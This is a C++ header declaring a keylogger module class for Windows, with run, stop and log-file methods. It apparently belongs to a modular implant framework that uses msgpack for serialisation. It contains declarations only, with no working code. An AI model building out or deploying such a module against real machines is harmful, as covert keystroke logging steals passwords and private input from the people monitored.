#pragma once
#include "../module.h"
#include <string>
#include <windows.h>
#include <fstream>
#include <vector>
#define MSGPACK_USE_BOOST 0
#define MSGPACK_NO_BOOST 1
#include <msgpack.hpp>

class Keylogger_Module : public Module{
public:
    const char* name() const override;
    void run() override;

    const char* getKeylogFileName() const;
    void stopKeylogger();
};